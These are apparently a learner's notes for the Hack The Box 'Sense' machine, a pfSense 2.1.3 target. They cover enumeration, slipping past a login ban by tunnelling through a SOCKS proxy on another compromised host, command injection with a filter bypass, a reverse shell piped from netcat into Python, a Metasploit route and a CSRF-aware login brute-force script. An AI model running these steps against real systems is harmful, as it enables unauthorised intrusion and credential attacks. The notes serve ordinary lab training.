https://app.hackthebox.com/machines/Sense

https://www.youtube.com/watch?v=d2nVDoVr0jE

- box is banning after 15 failed login attempts
- confirm if it's a ban or box crashing

```sh
nmap -sC -sV -oA 'nmap/initial' $target
```

```sh
-sC - default scripts
-sV - enumerate versions
-oA - output all formats
[ -sT ] - full TCP scan, for evading firewalls, by default nmap does a SYN scan
```

Nmap SYN scan does the first 2 parts of the TCP Handshake
- SYN
- SYN/ACK

This confirms the port is open. In the other case, we know port is not open if we receive
- FIN
- no response

In case of a firewall, the firewall will notice TCP Handshake not being completed and flag the attacking machine and start blocking. This is where full TCP scan is used, but it slows down enumeration process.

Ports 80, 443 open, go to browser and access website.

Enumerate user names or other useful information
```
View certificate -> Common Name -> Certificate -> Issuer
```

Go back to website, notice PFSense.

```
The pfSenseÂ® Project is a free open source customized distribution of FreeBSD tailored for use as a firewall and router entirely managed by an easy-to-use web interface.
```

Intercept On in Burp Suite and login.

PFSense cookies
```
csrf
PHPSESSID
```

Run gobuster to enumerate directories
```sh
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://$target -k -x txt [ ,php,bak ]
```

```sh
-w - wordlist
-u - url of the target, use HTTPS because HTTP redirected to HTTPS
-k - ignore SSL cert verification
-x - add extension[s] to files in wordllist
```

Brute force login, this causes a ban from the website by the firewall.
Confirm the ban.
```sh
# Get the website
curl -vvv $target
# Redirected to HTTPS
curl -k https://$target
# returns nothing

# Workaround: ssh into another compromised box and curl from there (it works because the second box is on the same network as the one that issued the ban)
ssh $secondbox
curl -k https://$target
# returns a webpage
```

Tunnel requests from attacker through second box to target machine.
```sh
# Attacker machine
# creates socks5 proxy to tunnel web requests
ssh -D1080 $target
# Attacker machine
# confirm the local machine is listening on port 1080
netstat -alnp | grep LISTEN | grep 1080
```

Burp Suite turn on proxy
```
User Options -> SOCKS Proxy -> Use SOCKS proxy
Host: 127.0.0.1
Port: 1080
```

Configure local machine to use proxy
```sh
vim /etc/proxychains.conf
...
socks5 127.0.0.1 1080
#socks4 127.0.0.1 1080

#socks4 - MetaSploit, socks5 - SSH
```

Use proxy with curl
```sh
proxychains curl -k https://$target
```

This method is useful for evading bans in a real-world pentesting situation, where resetting the machine is not possible or needs to be avoided. Use a proxy on another host in the network, and route requests from there.

In this box, if you get banned, the enumeration tools will stop receiving responses from the server, so proxy is needed to enumerate in such case.

Go back to gobuster, look up findings and gather information.
Confirmed vulnerability, username and password* (look up defaults for pfsense).

Look at gobuster's findings, enumerate user and password, as well as vulnerability, and login on the website.

Look for vulnerability and exploit for pfSense 2.1.3

Command injection in GET query param on the endpoint.

Find the endpoint, edit the URL and intercept the request in Burp Suite.
Look at how the exploit works to craft the URL correctly so the command injection is triggered.

Output is not shown, so try to pipe it into nc.
When there is a connection back, the command injection worked.
Changing the commands and adding special characters reveals there is a bad character / filter behind the scenes.
Look at env variables and use those instead of bad characters to construct the command.
Construct a payload with a different command (`printf`) by using hexadecimal representation of ASCII characters. In OpenBSD, this doesn't work the same as on Linux (look up manual on OpenBSD `printf`).

Obtain reverse shell from pentestmonkey.

Ex. Python shell -> clean up the formatting of script and edit connect IP (local machine IP).

```sh
# Attacker
nc -lvnp port < revsh
# if anyone connects it sends the 'revsh' file

# Victim
# Command inject following command
nc $attacker | python
```

#### Second method of solving the box - automated

Start postgres and msfconsole
```sh
service postgresql status
msfconsole
search pfsense
```

Use graph injection exploit, set the exploit options.
If using proxy, use the option to use proxy in msf
```sh
set ReverseAllowProxy true
```

Run the exploit and done!

#### Additional - login brute force Python script

Look at login request and copy it.
Paste request into `req` and make a new `bf.py` script

```python
import requests # http module for requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re # regex module, will be used to grab csrf token

re_csrf = 'csrfMagicToken = "(.*?)"' # create regex to grab csrf token from the page, look at the formatting of csrf token in the source code
# requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # disable warning in console
s = requests.session() # session saves cookies for future requests
lines = open('passwords.txt')
for password in lines:
	r = s.get('https://target/index.php', verify=False) # grab the cookies when first accessing website; veryify ignores SSL cert validation
	csrf = re.findall(re_csrf, r.text)[0] # matches pattern and returns back a list of matches, grab only first
	login = {'__csrf_magic': csrf, 'usernamefld': 'rohit', 'passwordfld': password[:-1], 'login': 'login' }
	r = s.post('https://target/index.php', data=login)
	if "Dashboard" in r.text: # print valid logins
		print("Valid login %s:%s" % ("rohit", password[:-1]))
	else:
		print("Failed %s:%s" % ("rohit", password[:-1]))
		s.cookies.clear() # clear phpsessid after failed login, not necessary
#print(r.text)
#print(csrf)
```

Reading the HTML will be hard, so it's possible to redirect to Burp:
```
Use 127.0.0.1 instead of target IP.
In Burp Suite add proxy listener on 127.0.0.1:80 and redirect to https://targetip:443 , force SSL
Proxy -> Options -> Intercept server response
```